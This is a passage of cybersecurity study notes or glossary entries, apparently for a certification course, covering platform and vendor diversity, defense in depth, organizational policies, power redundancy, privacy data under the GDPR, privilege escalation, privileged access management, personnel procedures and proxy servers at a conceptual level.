Platform diversity is a concept in cybersecurity that refers to using multiple technologies, operating systems, and hardware or software components within an organization's infrastructure. By incorporating a variety of platforms, businesses can reduce the risk of a single vulnerability or attack affecting their entire infrastructure. This approach is important for cybersecurity operations, as it helps create a more resilient environment that can better withstand cyber threats.

When an organization relies on a single technology or platform, an attacker who discovers a vulnerability can potentially compromise the entire system. However, with platform diversity, even if one component is compromised, other parts of the system remain secure, limiting the potential damage. Furthermore, a diverse technology landscape can make it more challenging for threat actors to navigate, as they must be familiar with multiple platforms and exploit techniques. In this way, platform diversity deters potential attackers and contributes to the overall robustness of an organization's cybersecurity posture.

Defense in Depth
Defense in depth is a comprehensive cybersecurity strategy that emphasizes the implementation of multiple layers of protection to safeguard an organization's information and infrastructure. This approach is based on the principle that no single security measure can completely protect against all threats. By deploying a variety of defenses at different levels, organizations can create a more resilient security posture that can withstand a wide range of attacks. For example, a defense in depth strategy might include perimeter security measures such as firewalls and intrusion detection systems to protect against external threats. Organizations can implement segmentation, secure access controls, and traffic monitoring at the network level to prevent unauthorized access and contain potential breaches. Endpoint security solutions, such as antivirus software and device hardening, help protect individual devices, while regular patch management ensures software vulnerabilities are addressed promptly.

Additionally, implementing strong user authentication methods, such as multifactor authentication, can further secure access to sensitive data and systems. Finally, employee security awareness training and incident response planning are essential components of a defense in depth strategy, helping to minimize human error and ensure a rapid response to security incidents.

Vendor Diversity
Vendor diversity is essential for several reasons, offering benefits not only in terms of cybersecurity but also in business resilience, innovation, and competition:

1. Cybersecurity - Relying on a single vendor for all software and hardware solutions can create a single point of failure. The entire infrastructure may be at risk if a vulnerability is discovered in that vendor's products. Vendor diversity introduces multiple technologies, reducing the impact of a single vulnerability and making it more difficult for attackers to exploit the entire system.

2. Business Resilience - Vendor diversity mitigates the risk associated with vendor lock-in and ensures that an organization's operations are not solely reliant on one vendor's products or services. If a vendor stops doing business, goes bankrupt, or experiences a significant disruption, having alternatives helps maintain business continuity.

3. Innovation - Diverse vendors bring different perspectives, ideas, and technologies. Leveraging solutions from multiple vendors can lead to a more innovative and agile IT infrastructure, better positioning an organization to adapt to emerging trends and technologies.

4. Competition - Vendor diversity promotes healthy competition in the market, which can lead to better pricing, improved product features, and higher-quality customer support. By engaging multiple vendors, organizations can encourage continuous improvement and obtain better value for their investments.

5. Customization and Flexibility - Different vendors offer unique solutions that cater to specific needs, and having a diverse vendor ecosystem allows organizations to choose the best fit for their requirements. This flexibility can result in a more tailored and effective IT infrastructure.

6. Risk Management - Vendor diversity helps spread the risk associated with potential product or service failures, security breaches, and other issues. Organizations can better manage and mitigate risks by not trusting a single solution provider or supplier.

7. Compliance - In some industries, regulations or industry standards may require organizations to maintain vendor diversity to ensure compliance and reduce the risk of supply chain disruptions or security breaches.
Other types of controls contribute to defense in depth, such as physical security controls that block physical access to computer equipment and policies designed to define appropriate use and consequences for noncompliance.

Multi-Cloud Strategies
A multi-cloud strategy offers several benefits for both cybersecurity operations and business needs by leveraging the strengths of multiple cloud service providers. This approach enhances cybersecurity by diversifying the risk associated with a single point of failure, as vulnerabilities or breaches in one cloud provider's environment are less likely to compromise the entire infrastructure. Additionally, a multi-cloud strategy can improve security posture by implementing unique security features and services offered by different cloud providers. From a business perspective, a multi-cloud approach promotes vendor independence, reducing the risk of vendor lock-in and ensuring organizations can adapt to changing market conditions or technology trends. This strategy fosters healthy competition among cloud providers, often leading to more favorable pricing and better service offerings. Furthermore, a multi-cloud strategy enables organizations to optimize their IT infrastructure by selecting the most suitable cloud services for specific workloads or applications, enhancing performance and cost efficiency.

In a practical example of a multi-cloud strategy, a company operating a large e-commerce platform can distribute workloads across multiple cloud providers to address high availability, data security, performance optimization, and cost efficiency. By hosting the primary application infrastructure on one cloud provider and using another for backup and disaster recovery, the company ensures continuous operation even during outages. Storing sensitive customer data with a cloud provider that offers advanced security features and compliance certifications meets regulatory requirements. To address latency and performance concerns, the company can leverage a cloud provider with a global network of edge locations for content delivery and caching services. Finally, cost-effective storage and processing services can be used by another provider for big data analytics and reporting. This multi-cloud approach enables the e-commerce company to build a more resilient, secure, and efficient IT infrastructure tailored to their specific needs.
Playbook - A checklist of actions to perform to detect and respond to a specific type of incident.

A playbook is a data-driven standard operating procedure (SOP) to assist analysts in detecting and responding to specific cyber threat scenarios. The playbook starts with a report from an alert dashboard. It then leads the analyst through the analysis, containment, eradication, recovery, and lessons learned steps to take.
Pluggable Authentication Module (PAM) - A framework for implementing authentication providers in Linux.

A pluggable authentication module (PAM) is a package for enabling different authentication providers, such as smart-card log-in. The PAM framework can also be used to implement authentication to network directory services.
Point-to-Point Tunneling Protocol (PPTP) - Developed by Cisco and Microsoft to support VPNs over PPP and TCP/IP. PPTP is highly vulnerable to password cracking attacks and considered obsolete.
Policies - A strictly enforceable ruleset that determines how a task should be completed.

Organizational policies are vital in establishing effective governance and ensuring organizational compliance. They form the framework for operations, decision-making, and behaviors, setting the rules for a compliant and ethical corporate culture. Governance describes the processes used to direct and control an organization, including the processes for decision-making and risk management. Policies are the outputs of governance. They establish the rules that frame decision-making processes, risk mitigation, fairness, and transparency. They set expectations for performance, align the organization around common goals, prevent misconduct, and remove inefficiencies.

Compliance describes how well an organization adheres to regulations, policies, standards, and laws relevant to its operation. Organizational policies are critical in ensuring compliance by integrating legal and regulatory requirements into daily operations. Policies define the rules and procedures for maintaining compliance and outline the consequences of noncompliance.

For example, an organization may have a data privacy policy that explains how it will maintain compliance with relevant laws to protect customer data. The policy details data collection, storage, processing, and sharing practices, including employee responsibilities, to ensure that all organization members understand and adhere to the rules. Organizational policies help facilitate compliance assessments through internal and external audits as policies provide a roadmap auditors follow to determine whether an organization is operating as it claims and is successfully satisfying its regulatory obligations.

Common Organizational Policies
1. Acceptable Use Policy (AUP) - A policy that governs employees' use of company equipment and Internet services. ISPs may also apply AUPs to their customers. This policy outlines the acceptable ways in which network and computer systems may be used by defining what constitutes acceptable behavior by users. AUPs typically address browsing behavior, appropriate content, software downloads, and handling sensitive information. The goal of an AUP is to ensure that users do not engage in activities that could harm the organization or its resources. Also, the AUP should detail the consequences for non compliance, including details regarding how compliance is monitored and require employees to acknowledge their comprehension of the AUP's rules via signature.

2. Information Security Policies - A document or series of documents that are backed by senior management and that detail requirements for protecting technology and information assets from threats and misuse. These are policies created by an organization to ensure that all information technology users comply with rules and guidelines related to the security of the information stored within the environment or the organization's sphere of authority.

3. Business Continuity & Continuity of Operations Plans (COOP) - Business continuity and COOP policies focus on the critical processes that must remain operational during and after a substantial disruption like a natural disaster or a cyber-attack.

4. Disaster Recovery - A documented and resourced plan showing actions and responsibilities to be used in response to critical incidents. These policies detail the steps required to recover from a catastrophic event such as a natural disaster, major hardware failure, or a significant security breach. The goal is to restore operations as quickly and efficiently as possible.

5. Incident Response - This policy outlines the processes to be followed after a security breach, or cyberattack occurs. It details the steps for identifying, investigating, controlling, and mitigating the impact of incidents, including procedures for communicating about the incident to internal and external sources.

6. Software Development Life Cycle (SDLC) - The processes of planning, analysis, design, implementation, and maintenance that often govern software and systems development. SDLC policies govern software development within an organization. These policies provide a structured plan detailing the stages of development from initial requirement analysis to maintenance after deployment. It ensures that all software produced meets the organization's efficiency, reliability, and security standards.

7. Change Management - Change management policies outline how changes to IT systems and software are requested, reviewed, approved, and implemented, including all documentation requirements.
Political Motivation - Threat actor motivations driven by political, ethical, or ideological concerns. Examples include: an employee acting as a whistleblower because of ethical concerns about the organization's behavior; campaign groups disrupting services of organizations they believe act unethically; and nation-states using service disruption, data exfiltration, or disinformation against government organizations or companies in another state in pursuit of war aims.
Port Security - Preventing a device attached to a switch port from communicating on the network unless it matches a given MAC address or other protection profile.

Each wall port and switch port represents an opportunity for a threat actor to attach a device to the network. A threat actor who can operate a host with physical access to a network segment can launch a variety of attacks.

Access to the physical switch ports and switch hardware should be restricted to authorized staff. To accomplish this place the switch appliances in secure server rooms and/or lockable hardware cabinets. To prevent the attachment of unauthorized client devices at unsecured wall ports, the switch port that the wall port cabling connects to can be administratively disabled, or the patch cable can be physically removed from the switch port. Completely disabling ports in this way can introduce a lot of administrative overhead and allow room for error. Also, it doesn't provide complete protection, as an attacker could unplug a device from an enabled port and connect their own machine. Consequently, more sophisticated methods of ensuring port security have been developed.
Post Office Protocol v3 (POP3) - Application protocol that enables a client to download email messages from a server mailbox to a client over port TCP/110 or secure port TCP/995.
Potentially Unwanted Programs (PUPs) / Potentially Unwanted Applications (PUAs) - Software that cannot definitively be classed as malicious, but may not have been chosen by or wanted by the user. These are software installed alongside a package selected by the user or perhaps bundled with a new computer system. Unlike a Trojan, the presence of a PUP is not automatically regarded as malicious. It may have been installed without active consent or with consent from a purposefully confusing license agreement. This type of software is sometimes described as grayware rather than malware. It can also be referred to as bloatware.
Power Distribution Unit (PDU) - An advanced strip socket that provides filtered output voltage. A managed unit supports remote administration.
Power Redundancy - All types of computer systems require a stable power supply to operate. Electrical events, such as voltage spikes or surges, can crash computers and network appliances, while loss of power from under-voltage events or power failures will cause equipment to fail. Power management means deploying systems to ensure that equipment is protected against these events and that network operations can either continue uninterrupted or be recovered quickly.

Dual Power Supplies
An enterprise-class server or appliance enclosure is likely to feature two or more power supply units (PSUs) for redundancy. A hot plug PSU can be replaced (in the event of failure) without powering down the system.

Managed Power Distribution Units (PDUs)
The power circuits supplying grid power to a rack, network closet, or server room must be enough to meet the load capacity of all the installed equipment, plus room for growth. Consequently, circuits to a server room will typically be of higher capacity than domestic or office circuits (30 or 60 amps as opposed to 13 amps, for instance). These circuits may be run through a power distribution unit (An advanced strip socket that provides filtered output voltage. A managed unit supports remote administration). These come with circuitry to "clean" the power signal; provide protection against spikes, surges, and under-voltage events; and integrate with uninterruptible power supplies (UPSs). Managed PDUs support remote power monitoring functions, such as reporting load and status, switching power to a socket on and off, or switching sockets on in a particular sequence.

Battery Backups and Uninterruptible Power Supplies (UPSs)
If there is a loss of power, system operation can be sustained for a few minutes or hours (depending on load) using a battery backup. A battery backup can be provisioned at the component level for disk drives and RAID arrays. The battery protects any read or write operations cached at the time of power loss. At the system level, an uninterruptible power supply (A battery-powered device that supplies AC power that an electronic device can use in the event of power failure) will provide a temporary power source in a complete power loss. This may range from a few minutes for a desktop-rated model to hours for an enterprise system. In its simplest form, a UPS comprises a bank of batteries and their charging circuit plus an inverter to generate AC voltage from the DC voltage supplied by the batteries.

The UPS allows sufficient time to failover to an alternative power source, such as a standby generator. If there is no secondary power source, a UPS will allow the administrator to at least shut down the server or appliance properly—users can save files, and the OS can complete the proper shutdown routines.

Generators
A backup power generator (A standby power supply fueled by diesel or propane. In the event of a power outage, a UPS must provide transitionary power, as a backup generator cannot be cut in fast enough) can provide power to the whole building, often for several days. Most generators use diesel, propane, or natural gas as a fuel source. With diesel and propane, the main drawback is safe storage (diesel also has a shelf life of between 18 months and 2 years); with natural gas, the issue is a reliable gas supply in the event of a natural disaster. Datacenters are also investing in renewable power sources, such as solar, wind, geothermal, hydrogen fuel cells, and hydro. The ability to use renewable power is a strong factor in determining the best site for new datacenters. Large-scale battery solutions, such as Tesla's Powerpack, may provide an alternative to backup power generators. There are also emerging technologies that use all the battery resources of a datacenter as a microgrid for power storage.

A UPS is always required to protect against any interruption to computer services, as a backup generator cannot be brought online fast enough to respond to a power failure. Generator power is typically introduced via transfer switches that can operate either manually or automatically. The UPS must be sized appropriately to handle power requirements during the transfer process.
Pre-shared Key (PSK) - A wireless network authentication mode where a passphrase-based mechanism is used to allow group authentication to a wireless network. The passphrase is used to derive an encryption key.
Preparation - An incident response process that hardens systems, defines policies and procedures, establishes lines of communication, and puts resources in place.
Pretexting - Social engineering tactic where a team will communicate, whether directly or indirectly, a lie or half-truth in order to get someone to believe a falsehood. The use of a carefully crafted story with convincing or intimidating details is referred to as pretexting. Making a convincing impersonation to either charm or intimidate a target usually depends on the attacker obtaining privileged information about the organization. For example, when the attacker impersonates a member of the organization's IT support team, the attack will be more effective with the identity details of the person being impersonated and the target.
Preventive Security Control - A type of security control that acts before an incident to eliminate or reduce the likelihood that an attack can succeed. The control acts to eliminate or reduce the likelihood that an attack can succeed. A preventive control operates before an attack can take place. Access control lists (ACL) configured on firewalls and file system objects are preventive-type technical controls. Antimalware software acts as a preventive control by blocking malicious processes from executing.
Privacy Data - Privacy data refers to personally identifiable or sensitive information associated with an individual's personal, financial, or social identity, including data that, if exposed or mishandled, could infringe upon an individual's privacy rights. Examples of privacy data include names, addresses, contact information, social security numbers, medical records, financial transactions, and, generally, any other data that can be used to identify a specific person. Privacy data and confidential data have certain similarities. Both types of data require protection due to their sensitive nature. Unauthorized access, disclosure, or misuse of privacy or confidential data can negatively affect individuals or organizations.

Additionally, both privacy data and confidential data are subject to legal and ethical considerations. Organizations must comply with relevant laws and regulations, such as data protection and privacy laws, to safeguard both data types. However, there are also notable differences between privacy data and confidential data.

Confidential data encompasses any information that requires protection due to its confidential nature, regardless of whether it pertains to an individual. Examples include trade secrets, intellectual property, financial statements, proprietary algorithms, source code, and other nonpublic information. Privacy data, on the other hand, specifically refers to information that can identify or impact an individual's privacy. Confidential data is primarily concerned with safeguarding information from unauthorized access, use, or disclosure to maintain business competitiveness, protect intellectual property, or preserve the integrity of sensitive company data.

Privacy data focuses on protecting personal information to preserve an individual's privacy rights, prevent identity theft, and maintain the confidentiality of personal details. Privacy data is closely associated with the rights of individuals to control the use and disclosure of their personal information. Individuals have the right to access, correct, and request the deletion of their privacy data. In contrast, confidential data typically does not grant specific rights to the data subjects (An individual that is identified by privacy data), as it relates more to organizations' proprietary information. The handling of privacy data often requires explicit consent from the data subject for its collection, use, and disclosure, particularly in compliance with privacy laws and regulations. On the other hand, confidential data, while protected, may not necessarily require individual consent for its handling, as it is associated with internal or business-related information.

Privacy and confidential data share similarities in sensitivity and legal considerations. However, scope, focus, data subject rights, and consent requirements differ. While both types of data require careful handling and protection, privacy data pertains explicitly to personal information and individual privacy rights.

Legal Implications
Protecting privacy data carries significant local, national, and global legal implications. Many countries have specific privacy laws and regulations that dictate how personal data should be handled within their jurisdiction. These laws define the rights of individuals, the responsibilities of organizations, and the procedures for data protection and privacy enforcement. At the national level, data protection authorities or supervisory bodies enforce privacy laws and oversee compliance. They have the authority to investigate data breaches, issue fines, and take legal action against organizations that fail to protect privacy data or violate individuals' privacy rights. The General Data Protection Regulation (GDPR) in the European Union has had a substantial impact globally by setting high privacy and data protection standards. GDPR applies to organizations that process the personal data of EU residents, regardless of their physical location. This extraterritorial effect ensures that organizations worldwide adhere to GDPR principles when handling EU citizens' personal data. Cross-border data transfers are also subject to specific requirements and restrictions. For example, the GDPR restricts transferring personal data outside the European Economic Area unless adequate safeguards exist to protect privacy data. Understanding and adhering to these legal requirements are essential to avoid legal consequences, maintain trust with individuals, and foster a global culture of privacy and data protection.

Roles and Responsibilities
Data Controller and Data Processor are two distinct roles defined under data protection regulations, such as the General Data Protection Regulation (GDPR). Although they both deal with personal data, these roles have important similarities and differences. The Data Controller and Data Processor are involved in handling personal data. Both roles are responsible for ensuring personal data protection in compliance with data protection laws and regulations. The Data Controller and Data Processor must also adhere to data protection laws. They are required to process personal data lawfully, securely, and transparently.

The primary distinction lies in their roles and responsibilities. The Data Controller is the entity or organization that determines the purposes and means of processing personal data. They have overall control and responsibility for the processing of personal data. The Data Controller decides why and how personal data is processed. They exercise decision-making authority, define the purposes of data processing, and determine the categories of data to be processed. Data Controllers have direct legal obligations and responsibilities under data protection laws. They are accountable for handling compliance, obtaining appropriate consent from data subjects, providing privacy notices, implementing data protection policies and procedures, and handling data subject requests. The Data Processor processes personal data on behalf of the Data Controller. They act under the authority and instructions of the Data Controller. Data Processors do not have independent decision-making power over personal data. They process data solely as instructed by the Data Controller. Data Processors have legal obligations to process personal data only for the purposes defined by the Data Controller. They must implement appropriate security measures, maintain the confidentiality and integrity of the data, and cooperate with the Data Controller to meet their legal obligations. Data Processors are also required to keep records of their processing activities. Data Processors include cloud service providers or payroll processing companies, for example.

A data subject refers to an individual whose personal data is processed by an organization or other entity. They are the individuals to whom the personal data refers. Data subjects hold certain rights and protections under data protection laws, such as the General Data Protection Regulation (GDPR) and California Consumer Privacy Act (CCPA). One of the rights afforded to data subjects is the right of access, meaning that data subjects have the right to request access to their personal data and obtain information about how it is being processed. Subjects can inquire about the purposes of processing, the categories of data being processed, recipients of the data, and the duration of data retention. Data subjects have the right to rectification, which means that if data subjects discover that the personal data held by an organization is inaccurate or incomplete, they have the right to request its correction to ensure that their personal data is up to date and accurate. Data subjects also have the right to request the erasure or removal of their personal data under certain circumstances.

For example, if the data is no longer necessary for the purposes it was collected, or if the data subject withdraws their consent for its processing, they can request its deletion. Data subjects can request the restriction of processing their personal data. The implications are that while privacy data can still be stored, it cannot be processed further except under specific conditions. This right gives data subjects control over their personal data's ongoing use. Data portability is another right granted to data subjects. Subjects have the right to receive their personal data in a commonly used and machine-readable format, ensuring their ability to move and transfer their personal information as desired. Data subjects have the right to object to processing their personal data based on specific grounds. Examples include if a subject believes their data is being processed for purposes that are not legitimate or if they wish to object to direct marketing activities. Lastly, data subjects have the right to withdraw their consent for the processing of their personal data. If the processing is based on their consent, they can revoke it at any time, and the organization must cease processing the data accordingly.

Data subjects exercise these rights by contacting the Data Controller, who ensures that data subject rights are respected, facilitating the exercise of these rights, and addressing any concerns or requests from data subjects.

Right to Be Forgotten
The "right to be forgotten" is a fundamental principle outlined in the General Data Protection Regulation (GDPR) that grants data subjects the right to request the erasure or deletion of their personal data under certain circumstances. It empowers individuals to have their personal information removed from online platforms, databases, or any other sources where their data is being processed and made publicly available.

The right to be forgotten recognizes the importance of individual privacy and control over personal data. Upon receiving a valid erasure request, the Data Controller must erase the personal data promptly unless there are legitimate grounds for refusing the request. This right extends to the removal of data from the organization's systems and to any third parties with whom the data has been shared or made publicly available. This right may be limited if the processing of personal data is necessary for exercising the right of freedom of expression and information, compliance with a legal obligation, or the establishment, exercise, or defense of legal claims. The right to be forgotten serves as a mechanism for individuals to regain control over their personal information. It promotes privacy and data protection by enabling subjects to remove personal data when it is no longer necessary or lawful to retain it.

Ownership of Privacy Data
The question of ownership regarding privacy data is a complex topic. In general, it is not easy to attribute traditional notions of ownership to privacy data. The ownership of privacy data is often not considered in terms of traditional property rights. Under many data protection laws, such as the GDPR, the emphasis is placed on the rights and protections of the data subject rather than determining ownership. The data subject has control over their personal data and can exercise certain rights, such as the right to access, rectify, and delete their data.

However, organizations that collect and process personal data are considered custodians or stewards of the data rather than owners. They have legal and ethical responsibilities to handle personal data securely and lawfully and to respect the rights of the data subjects. It is important to note that privacy data often consists of information about individuals, and those individuals have a strong interest in protecting their personal information. Data protection laws aim to provide individuals with control and protection over their personal data, ensuring transparency, consent, and fair processing practices. While the concept of ownership might not directly apply to privacy data, individuals have rights and control over their personal information, and organizations are legally accountable for handling the data responsibly. The focus is on safeguarding privacy rights and ensuring data protection rather than assigning ownership in the traditional sense.

Data Inventories and Retention
Privacy laws profoundly impact data inventories and data retention practices within organizations. These laws, such as the GDPR and CCPA, require organizations to maintain a detailed record of the personal data they collect, process, and store. Data inventories provide a comprehensive overview of the types of data being handled, the purposes for processing, the legal basis, and recipients of the data to ensure transparency and accountability, as organizations can clearly understand and document their data processing activities in compliance with privacy laws. Privacy laws stipulate that organizations must have a lawful basis for processing personal data. Data inventories (An individual that is identified by privacy data) are crucial in identifying the legal grounds for data processing. By documenting the legal basis for each category of personal data, organizations can ensure that their processing activities align with the specified lawful purposes outlined in privacy laws. Organizations must collect and process only the necessary elements of personal data for specific and legitimate purposes. Data inventories assist organizations in evaluating the personal data they collect, ensuring they only gather necessary information. By keeping the inventory up to date, organizations can align their practices with the principles of data minimization and purpose limitation.

Data retention (The process an organization uses to maintain the existence of and control over certain data in order to comply with business policies and/or applicable laws and regulations) is another area impacted by privacy laws. Organizations must retain personal data only for as long as necessary to fulfill the intended purpose or as required by law. Data inventories help organizations determine appropriate retention periods for different categories of personal data, ensuring compliance with data storage limitation requirements. Keeping accurate records in the data inventory enables organizations to securely delete or anonymize data when it is no longer needed. Privacy laws grant individuals various rights, such as the right to access their personal data. Data inventories are instrumental in facilitating the exercise of these rights. By maintaining comprehensive inventories, organizations can promptly respond to data subject requests, provide individuals with access to their data, rectify inaccuracies, and fulfill requests for erasure in accordance with privacy laws.

Furthermore, privacy laws mandate implementing robust security measures to protect personal data. Data inventories help organizations identify their personal data types and all associated security requirements. By clearly understanding the data they process, organizations can implement appropriate technical and organizational safeguards to shield personal data from unauthorized access, loss, or alteration, thus ensuring compliance with security obligations under privacy laws.
Private / Personal Data - This information relates to an individual identity. Private data examples include personally identifiable information (PII) such as names, addresses, social security numbers, financial information, and sensitive data like health records, login credentials, biometric data, and confidential business information.
Private Cloud - A cloud that is deployed for use by a single entity.

A cloud infrastructure that is completely private to and owned by the organization. In this case, there is likely to be one business unit dedicated to managing the cloud while other business units make use of it. With private cloud computing, organizations exercise greater control over the privacy and security of their services. This type of delivery method is geared more toward banking and governmental services that require strict access control in their operations.

A private cloud could be on-premises or off-site relative to the other business units. An on-site link can obviously deliver better performance and is less likely to be subject to outages (loss of an Internet link, for instance). On the other hand, a dedicated off-site facility may provide better shared access for multiple users in different locations.
Private Key - In asymmetric encryption, the private key is known only to the holder and is linked to, but not derivable from, a public key distributed to those with whom the holder wants to communicate securely. A private key can be used to encrypt data that can be decrypted by the linked public key or vice versa.
Privilege Escalation - The practice of exploiting flaws in an operating system or other application to gain a greater level of access than was intended for the user or application.

The purpose of most application attacks is to allow the threat actor to run their own code on the system. This is referred to as arbitrary code execution (A vulnerability that allows an attacker to run their own code or a module that exploits such a vulnerability). Where the code is transmitted from one machine to another, it can be referred to as remote code execution. The code would typically be designed to install some sort of backdoor or to disable the system in some way.

An application or process must have privileges to read and write data and execute functions. Depending on how the software is written, a process may run using a system account, the account of the logged-on user, or a nominated account. If a software exploit works, the attacker may be able to execute arbitrary code with the same privilege level as the exploited process. There are two main types of privilege escalation:

1. Vertical Privilege Escalation (or elevation) - When an attacker can perform functions that are normally assigned to users in higher roles, and often explicitly denied to the attacker. It is where a user or application can access functionality or data that should not be available to them. For instance, a process might run with local administrator privileges, but a vulnerability allows the arbitrary code to run with higher SYSTEM privileges.

2. Horizontal Privilege Escalation - When a user accesses or modifies specific resources that they are not entitled to. It is where a user accesses functionality or data that is intended for another user. For instance, via a process running with local administrator privileges on a client workstation, the arbitrary code is able to execute as a domain account on an application server.
Without performing detailed analysis of code or process execution in real time, it is privilege escalation that provides the simplest indicator of an application attack. If process logging has been configured, the audit log can provide evidence of privilege escalation attempts. These attempts may also be detected by incident response and endpoint protection agents, which will display an alert.
Privileged access management (PAM) - Policies, procedures, and support software for managing accounts and credentials with administrative permissions.

Privileged access management (PAM) refers to policies, procedures, and technical controls to prevent compromise of privileged accounts. These controls identify and document privileged accounts, giving visibility into their use, and managing the credentials used to access them.

It is a good idea to restrict the number of administrative accounts as much as possible. The more accounts there are, the more likely it is that one of them will be compromised. On the other hand, you do not want administrators to share accounts or to use default accounts, as that compromises accountability.

Users with administrative privileges must take the greatest care with credential management. Privilege-access accounts must use strong passwords and ideally multifactor authentication (MFA) or passwordless authentication.

To protect privileged account credentials, administrators should conduct their work on designated devices rather than trusting any available device. A secure administrative workstation (SAW) is a computer with a very low attack surface running the minimum possible apps.

Traditional administrator accounts have standing permissions. Just-in-time (JIT) permissions means that an account's elevated privileges are not assigned at log-in. Instead, the permissions must be explicitly requested and are only granted for a limited period. This is referred to as zero standing privileges (ZSP). There are three main models for implementing this:

1. Temporary Elevation - means that the account gains administrative rights for a limited period. The User Account Control (UAC) feature of Windows and the sudo command in Linux use this concept.

2. Password Vaulting / Brokering - means the privileged account must be "checked out" from a repository and is made available for a limited amount of time. The administrator must log a justification for using the privileges. Approval of the request could be automated via system-enforced policies or require manual intervention, providing a measure of M of N control. This provides better accounting oversight than temporary elevation and better protection against compromise of privileged credentials.

3. Ephemeral Credentials - means the system generates or enables an account to use to perform the administrative task and then destroys or disables it once the task has been performed. Temporary or ephemeral membership of security groups or roles can serve a similar purpose.

As well as human administrators, PAM also applies to service accounts.
Procedures - Detailed instructions for completing a task in a way that complies with policies and standards.

Policies and guidelines set a framework for behavior. Procedures define step-by-step instructions and checklists for ensuring that a task is completed in a way that complies with policy.

Personnel Management
Identity and access management (IAM) involves both IT/security procedures and technologies and Human Resources (HR) policies. Personnel management policies are applied in three phases:

1. Recruitment (hiring) - Locating and selecting people to work in particular job roles. Security issues here include screening candidates and performing background checks.

2. Operation (working) - It is often the HR department that manages the communication of policy and training to employees (though there may be a separate training and personal development department within larger organizations). As such, it is critical that HR managers devise training programs that communicate the importance of security to employees.

3. Termination or Separation (firing or retiring) - Whether an employee leaves voluntarily or involuntarily, termination is a difficult process, with numerous security implications.

Background Checks
A background check determines that a person is who they say they are and are not concealing criminal activity, bankruptcy, or connections that would make them unsuitable or risky. Employees working in high confidentiality environments or with access to high-value transactions will obviously need to be subjected to a greater degree of scrutiny. For some jobs, especially federal jobs requiring a security clearance, background checks are mandatory. Some background checks are performed internally, whereas others are done by an external third party.

Onboarding
Onboarding (The process of bringing in a new employee, contractor, or supplier) at the HR level is the process of welcoming a new employee to the organization. The same sort of principle applies to taking on new suppliers or contractors. Some of the same checks and processes are used in creating customer and guest accounts.

As part of onboarding, the IT and HR function will combine to create an account for the user to access the computer system, assign the appropriate privileges, and ensure the account credentials are known only to the valid user. These functions must be integrated to avoid creating accidental configuration vulnerabilities, such as IT creating an account for an employee who is never actually hired. Some of the other tasks and processes involved in onboarding include the following:

1. Secure Transmission of Credentials - Creating and sending an initial password or issuing a smart card securely. The process needs protection against rogue administrative staff. Newly created accounts with simple or default passwords are an easily exploitable backdoor.

2. Asset Allocation - Provision computers or mobile devices for the user or agree to the use of bring-your-own-device handsets.

3 .Training/Policies - Schedule appropriate security awareness and role-relevant training and certification.

IAM automation can streamline onboarding by automating the provisioning and access management tasks associated with new employees. It enables the automated creation and configuration of user accounts, assignment of appropriate access privileges based on established roles and access policies, and integration with HR systems for efficient new employee data synchronization. IAM automation reduces manual effort, ensures consistency, and improves security by enforcing standardized access controls, ultimately accelerating onboarding while maintaining strong security practices.

Playbooks
Playbooks are essential to establishing and maintaining organizational procedures by establishing a central repository of well-defined, standardized strategies and tactics. They guide personnel to ensure consistency in operations and improve quality and effectiveness.

Playbooks facilitate knowledge sharing and continuity as employees move into new roles or leave the organization. Playbooks also mitigate risk by documenting critical procedures and preserving institutional knowledge. Playbooks help new team members quickly learn established processes while existing team members have a reference point for their tasks.

Moreover, playbooks act as a tool for quality assurance and continuous improvement. Clearly defining processes and the best practices to handle them makes it easier to identify and improve problem areas. By using playbooks, organizations can monitor the use and effectiveness of procedures over time and modify them as necessary to foster an environment of continual learning and development.

Most significantly, playbooks are essential in incident response and crisis management because they detail emergency procedures and contingency plans vital to steering activities during an emergency or crisis. Playbooks help incident response teams make quick decisions and work more effectively under stress, leading to more resilient operations and reducing the likelihood and impact of major security incidents.

Several best practice guides and frameworks are available to assist in developing playbooks, such as The MITRE ATT&CK framework and NIST Special Publication 800-61.

Change Management
The implementation of changes should be carefully planned, with consideration for how the change will affect dependent components. For most significant or major changes, organizations should attempt to trial the change first. Every change should be accompanied by a rollback (or remediation) plan, so that the change can be reversed if it has harmful or unforeseen consequences. Changes should also be scheduled sensitively if they are likely to cause system downtime or other negative impact on the workflow of the business units that depend on the IT system being modified. Most networks have a scheduled maintenance window period for authorized downtime. When the change has been implemented, its impact should be assessed and the process reviewed and documented to identify any outcomes that could help future change management projects.

Offboarding
Offboarding ensures that an employee leaves a company gracefully, including an exit interview for feedback. Offboarding is also used when a project with contractors or third parties ends. In terms of security, there are several processes that must be completed:

1. Account Management - Disable the user account and privileges. Ensure that any information assets created or managed by the employee but owned by the company are accessible (in terms of encryption keys or password-protected files).

2. Company Assets - Retrieve mobile devices, keys, smart cards, USB media, and so on. The employee will need to confirm (and in some cases prove) that they have not retained copies of any information assets.

3. Personal Assets - Wipe employee-owned devices of corporate data and applications. The employee may also be allowed to retain some information assets (such as personal emails or contact information), depending on the policies in force.

The departure of some types of employees should trigger additional processes to re-secure network systems. Examples include employees with detailed knowledge of security systems and procedures, and access to shared or generic account credentials. These credentials must be changed immediately.
Proprietary Data - Information created by an organization, typically about the products or services that it makes or provides. Proprietary information or intellectual property (IP) is information created and owned by the company, typically about the products or services that they make or perform. IP is an obvious target for a company's competitors, and IP in some industries (such as defense or energy) is of interest to foreign governments. IP may also represent a counterfeiting opportunity (movies, music, and books, for instance).
Proprietary Information - Information created by an organization, typically about the products or services that it makes or provides.
Proximity Reader - A scanner that reads data from an RFID or NFC tag when in range.
Proxy Server - A server that mediates the communications between a client and another server. It can filter and often modify communications as well as provide caching services to improve performance.

A firewall that performs application layer filtering is likely implemented as a proxy. Where a network firewall only accepts or blocks traffic, a proxy server works on a store-and-forward model. The proxy deconstructs each packet, performs analysis, then rebuilds the packet and forwards it on, providing it conforms to the rules.

The amount of rebuilding depends on the proxy. Some proxies only manipulate the IP and TCP headers. Application-aware proxies might add or remove HTTP headers. A deep packet inspection proxy might be able to remove content from an HTTP payload.

The main benefit of a proxy is that client computers connect to a specified point on the perimeter network for web access. This provides a degree of traffic management and security. In addition, most web proxy servers provide caching engines (a feature of many proxy servers that enables the servers to retain a copy of frequently requested web pages), whereby frequently requested webpages are retained on the proxy, negating the need to re-fetch those pages for subsequent requests.

A proxy server must understand the application it is servicing. For example, a web proxy must be able to parse and modify HTTP commands, and, potentially, webpage code and scripts too. Some proxy servers are application-specific; others are multipurpose. A multipurpose proxy is one configured with filters for multiple protocol types, such as web data, file transfer protocol data, and email protocol data.

Proxy servers can generally be classed as non-transparent or transparent.

